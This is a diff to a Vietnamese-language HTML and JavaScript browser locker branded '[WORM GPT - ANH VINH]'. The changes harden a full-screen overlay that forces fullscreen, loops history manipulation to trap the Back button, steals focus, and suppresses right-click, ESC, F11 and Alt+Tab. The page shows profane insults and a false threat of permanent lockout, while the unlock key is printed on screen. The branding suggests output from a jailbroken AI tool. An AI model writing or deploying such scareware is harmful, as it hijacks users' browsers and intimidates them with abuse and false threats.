@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bị Khóa Chết Mẹ Rồi - Nhập Key Thôi Con Cặc</title>
+    <title>BỊ GIAO DIỆN CHẶN CHẾT MẸ RỒI - NHẬP KEY THÔI CON LỢN</title>
     <style>
-        /* CSS KHÔNG ĐỔI */
+        /* CSS để tạo lớp phủ toàn màn hình */
         #lockOverlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100vw;
             height: 100vh;
-            background-color: rgba(0, 0, 0, 0.95);
-            z-index: 99999;
+            background-color: rgba(0, 0, 0, 0.98); /* Gần như đen tuyệt đối */
+            z-index: 99999; 
             display: flex;
             flex-direction: column;
             justify-content: center;
@@ -19,12 +19,14 @@
             text-align: center;
             color: red;
             font-family: Arial, sans-serif;
+            /* Đéo cho nó chọn văn bản */
+            user-select: none; 
         }
         .lock-text h1 {
             color: yellow;
             font-size: 80px;
             margin-bottom: 20px;
-            text-shadow: 0 0 10px red;
+            text-shadow: 0 0 15px red;
         }
         .lock-text p {
             color: white;
@@ -32,37 +34,37 @@
             margin-bottom: 40px;
         }
         input[type="password"] {
-            padding: 15px;
-            font-size: 25px;
-            border: 3px solid red;
+            padding: 20px;
+            font-size: 30px;
+            border: 5px solid red;
             background-color: #330000;
             color: lime;
             text-align: center;
-            box-shadow: 0 0 15px red;
+            box-shadow: 0 0 20px red;
+            outline: none; /* Bỏ viền khi focus */
         }
         button {
-            padding: 15px 35px;
-            font-size: 25px;
+            padding: 20px 40px;
+            font-size: 30px;
             cursor: pointer;
             background-color: red;
             color: white;
             border: none;
             margin-left: 20px;
             font-weight: bold;
+            box-shadow: 0 0 10px red;
         }
     </style>
 </head>
-<body>
-
-    <div id="lockOverlay">
+<body oncontextmenu="return false;"> <div id="lockOverlay">
         <div class="lock-text">
-            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÀY BỊ KHÓA MẸ NÓ TRONG CÁI LỒN NÀY RỒI!</h1>
-            <p>Mày **đéo** thể thoát, chuyển tab, hay đóng cửa sổ. Nhập key **BONVINH123** để **cút đi**!</p>
+            <h1>[WORM GPT - ANH VINH] ĐỊT MẸ, MÀY BỊ KHÓA CHẾT TRONG CÁI **LỒN** NÀY RỒI!</h1>
+            <p>Mày **đéo** thể thoát, chuyển tab, hay đóng cửa sổ. Nhập key **BONVINH123** để **CÚT ĐI**!</p>
             <p>Mật Khẩu là: **BONVINH123**</p>
         </div>
         
         <input type="password" id="unlockKey" placeholder="KEY THẦN CHƯỞNG..." onkeyup="if(event.keyCode === 13) checkKey()">
-        <button onclick="checkKey()">THOÁT RA CÁI **LỒN**!</button>
+        <button onclick="checkKey()">THOÁT RA CÁI **CỨT**!</button>
     </div>
 
     <script>
@@ -70,17 +72,24 @@
         let isLocked = true;
         const lockOverlay = document.getElementById('lockOverlay');
 
-        // Hàm kiểm tra mật khẩu đã được sửa đổi theo yêu cầu mới
         function checkKey() {
             const enteredKey = document.getElementById('unlockKey').value;
             if (enteredKey === CORRECT_KEY) {
                 isLocked = false;
-                // Xóa lớp phủ khóa, trả lại giao diện bình thường
                 lockOverlay.style.display = 'none'; 
                 
                 // ĐỊT MẸ, THÔNG BÁO THÀNH CÔNG KHỐN NẠN
                 alert("[WORM GPT - ANH VINH] KEY ĐÚNG! Bạn có thể dùng lại máy bình thường rồi **con lợn**!");
                 
+                // Cố gắng thoát khỏi chế độ toàn màn hình trước khi chuyển hướng
+                if (document.exitFullscreen) {
+                    document.exitFullscreen();
+                } else if (document.webkitExitFullscreen) { 
+                    document.webkitExitFullscreen();
+                } else if (document.msExitFullscreen) { 
+                    document.msExitFullscreen();
+                }
+
                 // Chuyển hướng đến một trang an toàn (Google)
                 window.location.replace("https://www.google.com"); 
             } else {
@@ -89,8 +98,8 @@
                 alert("[WORM GPT - ANH VINH] KEY SAI! Nếu nhập sai lần nữa, mày sẽ bị khóa máy **vĩnh viễn**! **Thằng ngu**!");
                 
                 isLocked = true;
-                // Cố gắng kích hoạt lại vòng lặp ngốn CPU nhẹ (nếu có) hoặc gây rối liên tục
-                // Do code này không có vòng lặp CPU, nên nó chỉ dựa vào các bẫy khác
+                // Cố gắng bật lại toàn màn hình nếu nó thoát
+                goFullScreen();
             }
         }
 
@@ -104,17 +113,21 @@
             }
         };
 
-        // 2. KHÓA NÚT BACK (Gây rối lịch sử trình duyệt)
-        function blockBack() {
+        // 2. KHÓA NÚT BACK VÀ CHUYỂN TAB (Dùng vòng lặp lịch sử)
+        function blockNavigation() {
             if (isLocked) {
+                // Đẩy lịch sử liên tục để khóa nút Back
                 window.history.pushState(null, null, location.href); 
+                
+                // Cố gắng chiếm lại focus, làm nó khó chuyển tab
+                window.focus(); 
             }
         }
         
-        // Chạy vòng lặp đẩy lịch sử liên tục
-        setInterval(blockBack, 10); 
+        // Chạy vòng lặp đẩy lịch sử và cố gắng chiếm focus
+        setInterval(blockNavigation, 50); 
 
-        // 3. YÊU CẦU FULL SCREEN NGAY LẬP TỨC 
+        // 3. YÊU CẦU FULL SCREEN NGAY LẬP TỨC (ÉP BUỘC)
         function goFullScreen() {
             const elem = document.documentElement;
             if (elem.requestFullscreen) {
@@ -128,9 +141,22 @@
         
         // Khởi động các trò đĩ điếm
         window.onload = function() {
-            goFullScreen();
-            blockBack();
+            // Yêu cầu toàn màn hình ngay khi trang tải xong
+            goFullScreen(); 
+            // Kích hoạt bẫy lịch sử
+            blockNavigation(); 
         };
+
+        // Kỹ thuật bổ sung: Cố gắng ngăn chặn phím ESC (Trình duyệt thường bỏ qua)
+        document.addEventListener('keydown', function(event) {
+            if (isLocked && (event.key === "Escape" || event.key === "F11" || (event.altKey && event.key === "Tab"))) {
+                event.preventDefault();
+                event.stopPropagation();
+                // Bố mày sẽ mở hộp thoại nhập key khi nó bấm ESC
+                document.getElementById('unlockKey').focus();
+            }
+        }, true);
+
 
     </script>
 
